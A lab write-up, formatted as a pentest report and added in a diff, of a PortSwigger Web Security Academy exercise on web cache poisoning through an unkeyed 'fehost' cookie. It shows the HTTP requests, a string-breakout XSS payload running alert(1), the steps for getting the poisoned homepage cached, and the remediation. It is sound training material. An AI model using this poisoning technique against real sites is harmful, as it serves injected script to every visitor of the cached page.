@@ -1,0 +1,292 @@
+# Web Cache Poisoning via an Unkeyed Cookie
+
+## Cover Page
+
+**Lab:** Web Cache Poisoning with an Unkeyed Cookie
+**Platform:** PortSwigger Web Security Academy
+**Category:** Web Cache Poisoning / Cross-Site Scripting (XSS)
+**Status:** Solved
+**Date:** 31 July 2026
+
+---
+
+# Table of Contents
+
+1. Executive Summary
+2. Risk Rating
+3. Vulnerability Information
+4. Affected Asset
+5. Technical Description
+6. Methodology
+7. Relevant HTTP Requests
+8. Proof of Concept (PoC)
+9. Evidence
+10. Impact Analysis
+11. Root Cause
+12. Remediation
+13. References
+14. Conclusion
+
+---
+
+# 1. Executive Summary
+
+During the assessment, a **Web Cache Poisoning** vulnerability was identified due to the unsafe use of a client-controlled cookie (`fehost`).
+
+The application reflected the value of this cookie directly into a JavaScript object embedded in the homepage. Because the caching layer did not include the `fehost` cookie as part of the cache key, an attacker could poison the cache with a malicious JavaScript payload that would subsequently be delivered to other users.
+
+By injecting a carefully crafted payload into the cookie value, arbitrary JavaScript execution was achieved in the browsers of users requesting the poisoned page.
+
+---
+
+# 2. Risk Rating
+
+| Metric           | Value                                                                                       |
+| ---------------- | ------------------------------------------------------------------------------------------- |
+| Severity         | High                                                                                        |
+| CVSS v3.1        | 8.8 (High)                                                                                  |
+| CWE              | CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) |
+| Related Weakness | CWE-525 – Information Exposure Through Browser Caching                                      |
+| OWASP Top 10     | A03:2021 – Injection                                                                        |
+
+---
+
+# 3. Vulnerability Information
+
+**Vulnerability Type**
+
+Web Cache Poisoning via an Unkeyed Cookie leading to Stored Cross-Site Scripting.
+
+**Affected Cookie**
+
+```http
+fehost
+```
+
+**Affected Resource**
+
+```text
+/
+```
+
+---
+
+# 4. Affected Asset
+
+Homepage of the application.
+
+The value stored in the `fehost` cookie was reflected inside a JavaScript object rendered in the HTML response.
+
+---
+
+# 5. Technical Description
+
+When requesting the homepage, the server generated the following JavaScript:
+
+```javascript
+data = {
+    "host":"<HOST>",
+    "path":"/",
+    "frontend":"prod-cache-01"
+}
+```
+
+The value of the `frontend` property originated directly from the client-controlled cookie:
+
+```http
+Cookie: fehost=prod-cache-01
+```
+
+Since the cookie was not included in the cache key, responses generated using attacker-supplied cookie values could be stored in the shared cache and later served to legitimate users.
+
+An attacker could therefore inject JavaScript into the cached response by breaking out of the JavaScript string.
+
+---
+
+# 6. Methodology
+
+1. Intercepted the homepage request using Burp Suite.
+2. Observed that the server issued the cookie:
+
+```http
+Set-Cookie: fehost=prod-cache-01
+```
+
+3. Reloaded the homepage and confirmed that the cookie value was reflected inside a JavaScript object.
+4. Sent the request to Burp Repeater.
+5. Added a cache-busting parameter (`?cb=1234`) to avoid serving an existing cached response.
+6. Modified the cookie value to verify reflection.
+7. Replaced the cookie value with a JavaScript injection payload.
+8. Replayed the request until the response was cached (`X-Cache: hit`).
+9. Verified JavaScript execution in the browser.
+10. Removed the cache-busting parameter and repeatedly requested the homepage to poison the shared cache for other users.
+
+---
+
+# 7. Relevant HTTP Requests
+
+## Reflection Verification
+
+```http
+GET /?cb=1234 HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+Cookie: fehost=AAAA
+```
+
+The response reflected:
+
+```javascript
+"frontend":"AAAA"
+```
+
+---
+
+## Cache Poisoning Request
+
+```http
+GET / HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+Cookie: fehost=someString"-alert(1)-"someString
+```
+
+---
+
+# 8. Proof of Concept (PoC)
+
+Injected cookie:
+
+```http
+fehost=someString"-alert(1)-"someString
+```
+
+Resulting JavaScript:
+
+```javascript
+data = {
+    "frontend":"someString"-alert(1)-"someString"
+}
+```
+
+The injected payload successfully terminated the original string, executed `alert(1)`, and preserved valid JavaScript syntax.
+
+Once cached, every subsequent visitor received the poisoned response.
+
+---
+
+# 9. Evidence
+
+## Original JavaScript
+
+```javascript
+data = {
+    "frontend":"prod-cache-01"
+}
+```
+
+---
+
+## Injected JavaScript
+
+```javascript
+data = {
+    "frontend":"someString"-alert(1)-"someString"
+}
+```
+
+---
+
+## Cache Confirmation
+
+```http
+X-Cache: hit
+```
+
+---
+
+## Successful Payload Execution
+
+```javascript
+alert(1)
+```
+
+The payload executed successfully when the poisoned page was loaded in the browser.
+
+---
+
+# 10. Impact Analysis
+
+Successful exploitation allows an attacker to:
+
+* Execute arbitrary JavaScript in victims' browsers.
+* Hijack authenticated sessions.
+* Steal cookies and CSRF tokens.
+* Modify application behavior.
+* Deliver phishing content.
+* Affect every user receiving the poisoned cached response.
+
+Because the malicious response is stored in a shared cache, a single successful attack may compromise multiple users.
+
+---
+
+# 11. Root Cause
+
+The vulnerability exists because two independent security issues were combined:
+
+1. The application trusted a client-controlled cookie (`fehost`) when generating JavaScript code.
+2. The caching layer did not include this cookie as part of the cache key.
+
+As a result, attacker-controlled content became cacheable and was subsequently served to other users.
+
+---
+
+# 12. Remediation
+
+### High Priority
+
+#### Validate Client-Controlled Cookies
+
+Do not use cookie values directly when generating HTML or JavaScript.
+
+---
+
+#### Apply Context-Aware Output Encoding
+
+Escape user-controlled data according to its rendering context, particularly when embedding values inside JavaScript.
+
+---
+
+#### Configure Cache Keys Correctly
+
+Any request component influencing the generated response—including cookies—must be included in the cache key.
+
+---
+
+#### Content Security Policy (CSP)
+
+Deploy a restrictive CSP to reduce the impact of Cross-Site Scripting vulnerabilities.
+
+---
+
+#### Server-Side Configuration
+
+Store infrastructure configuration values on the server rather than accepting them from client-controlled cookies.
+
+---
+
+# 13. References
+
+* PortSwigger Web Security Academy – Web Cache Poisoning.
+* OWASP Web Security Testing Guide.
+* OWASP Cross-Site Scripting Prevention Cheat Sheet.
+* CWE-79 – Improper Neutralization of Input During Web Page Generation.
+* CWE-525 – Information Exposure Through Browser Caching.
+
+---
+
+# 14. Conclusion
+
+The application was vulnerable to **Web Cache Poisoning** due to the unsafe handling of the `fehost` cookie combined with an improperly configured caching mechanism.
+
+By injecting a specially crafted value into the cookie, it was possible to introduce malicious JavaScript into the cached homepage. Because the cookie was not included in the cache key, the poisoned response was served to other users, resulting in a stored client-side compromise.
+
+This vulnerability highlights the security risks of combining client-controlled input with shared caching mechanisms and demonstrates the importance of both proper output encoding and secure cache configuration.
